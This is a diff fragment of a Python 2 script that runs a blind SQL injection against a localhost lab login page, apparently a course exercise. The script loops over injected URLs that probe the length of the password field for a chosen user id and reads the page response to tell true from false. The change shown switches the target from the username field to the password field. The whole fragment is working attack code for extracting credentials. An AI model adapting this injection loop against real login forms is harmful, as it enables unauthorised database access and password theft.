@@ -17,7 +17,7 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 ################################# Loop to get field's size
 
 for x in xrange(0,25):
-	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(username)%20=%20" + str(x) + "--%20"
+	request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20length(password)%20=%20" + str(x) + "--%20"
 	f = urllib.urlopen(request)
 	response = f.read()
 	if (response.find('cat.JPG')!=-1): 
